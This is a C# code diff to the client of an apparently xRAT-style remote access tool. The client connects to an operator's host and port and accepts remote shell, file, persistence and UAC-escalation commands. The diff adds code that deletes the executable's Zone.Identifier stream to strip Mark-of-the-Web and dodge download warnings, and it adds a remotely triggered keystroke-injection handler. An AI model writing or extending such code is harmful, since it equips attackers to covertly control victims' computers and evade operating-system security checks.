@@ -1,5 +1,7 @@
 ﻿using System;
 using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
 using xClient.Config;
@@ -17,6 +19,10 @@ namespace xClient
         private static bool _reconnect = true;
         private static volatile bool _connected = false;
         private static Mutex _appMutex;
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool DeleteFile(string lpFileName);
 
         [STAThread]
         private static void Main(string[] args)
@@ -65,6 +71,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.Directory),
                 typeof (Core.Packets.ServerPackets.DownloadFile),
                 typeof (Core.Packets.ServerPackets.MouseClick),
+                typeof (Core.Packets.ServerPackets.KeyPress),
                 typeof (Core.Packets.ServerPackets.GetSystemInfo),
                 typeof (Core.Packets.ServerPackets.VisitWebsite),
                 typeof (Core.Packets.ServerPackets.ShowMessageBox),
@@ -110,6 +117,15 @@ namespace xClient
             SystemCore.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
             SystemCore.AccountType = SystemCore.GetAccountType();
             SystemCore.InitializeGeoIp();
+
+            try
+            {
+                DeleteFile(Assembly.GetEntryAssembly().Location + ":Zone.Identifier");
+            }
+            catch (Exception)
+            {
+            }
+
 
             if (Settings.ENABLEUACESCALATION)
             {
@@ -159,6 +175,8 @@ namespace xClient
 
             if (!_connected)
                 ConnectClient.Connect(Settings.HOST, Settings.PORT);
+
+           // MessageBox.Show("Connecting");
 
             Thread.Sleep(200);
 
@@ -275,53 +293,57 @@ namespace xClient
             {
                 CommandHandler.HandleMouseClick((Core.Packets.ServerPackets.MouseClick) packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.GetSystemInfo))
+            else if (type == typeof(Core.Packets.ServerPackets.KeyPress))
             {
-                CommandHandler.HandleGetSystemInfo((Core.Packets.ServerPackets.GetSystemInfo) packet, client);
+                CommandHandler.HandleKeyPress((Core.Packets.ServerPackets.KeyPress)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.VisitWebsite))
+            else if (type == typeof(Core.Packets.ServerPackets.GetSystemInfo))
             {
-                CommandHandler.HandleVisitWebsite((Core.Packets.ServerPackets.VisitWebsite) packet, client);
+                CommandHandler.HandleGetSystemInfo((Core.Packets.ServerPackets.GetSystemInfo)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.ShowMessageBox))
+            else if (type == typeof(Core.Packets.ServerPackets.VisitWebsite))
             {
-                CommandHandler.HandleShowMessageBox((Core.Packets.ServerPackets.ShowMessageBox) packet, client);
+                CommandHandler.HandleVisitWebsite((Core.Packets.ServerPackets.VisitWebsite)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.Update))
+            else if (type == typeof(Core.Packets.ServerPackets.ShowMessageBox))
             {
-                CommandHandler.HandleUpdate((Core.Packets.ServerPackets.Update) packet, client);
+                CommandHandler.HandleShowMessageBox((Core.Packets.ServerPackets.ShowMessageBox)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.Monitors))
+            else if (type == typeof(Core.Packets.ServerPackets.Update))
             {
-                CommandHandler.HandleMonitors((Core.Packets.ServerPackets.Monitors) packet, client);
+                CommandHandler.HandleUpdate((Core.Packets.ServerPackets.Update)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.ShellCommand))
+            else if (type == typeof(Core.Packets.ServerPackets.Monitors))
             {
-                CommandHandler.HandleShellCommand((Core.Packets.ServerPackets.ShellCommand) packet, client);
+                CommandHandler.HandleMonitors((Core.Packets.ServerPackets.Monitors)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.Rename))
+            else if (type == typeof(Core.Packets.ServerPackets.ShellCommand))
             {
-                CommandHandler.HandleRename((Core.Packets.ServerPackets.Rename) packet, client);
+                CommandHandler.HandleShellCommand((Core.Packets.ServerPackets.ShellCommand)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.Delete))
+            else if (type == typeof(Core.Packets.ServerPackets.Rename))
             {
-                CommandHandler.HandleDelete((Core.Packets.ServerPackets.Delete) packet, client);
+                CommandHandler.HandleRename((Core.Packets.ServerPackets.Rename)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.Action))
+            else if (type == typeof(Core.Packets.ServerPackets.Delete))
             {
-                CommandHandler.HandleAction((Core.Packets.ServerPackets.Action) packet, client);
+                CommandHandler.HandleDelete((Core.Packets.ServerPackets.Delete)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.GetStartupItems))
+            else if (type == typeof(Core.Packets.ServerPackets.Action))
             {
-                CommandHandler.HandleGetStartupItems((Core.Packets.ServerPackets.GetStartupItems) packet, client);
+                CommandHandler.HandleAction((Core.Packets.ServerPackets.Action)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.AddStartupItem))
+            else if (type == typeof(Core.Packets.ServerPackets.GetStartupItems))
             {
-                CommandHandler.HandleAddStartupItem((Core.Packets.ServerPackets.AddStartupItem) packet, client);
+                CommandHandler.HandleGetStartupItems((Core.Packets.ServerPackets.GetStartupItems)packet, client);
             }
-            else if (type == typeof (Core.Packets.ServerPackets.DownloadFileCanceled))
+            else if (type == typeof(Core.Packets.ServerPackets.AddStartupItem))
             {
-                CommandHandler.HandleDownloadFileCanceled((Core.Packets.ServerPackets.DownloadFileCanceled) packet,
+                CommandHandler.HandleAddStartupItem((Core.Packets.ServerPackets.AddStartupItem)packet, client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.DownloadFileCanceled))
+            {
+                CommandHandler.HandleDownloadFileCanceled((Core.Packets.ServerPackets.DownloadFileCanceled)packet,
                     client);
             }
             else if (type == typeof(Core.Packets.ServerPackets.GetLogs))
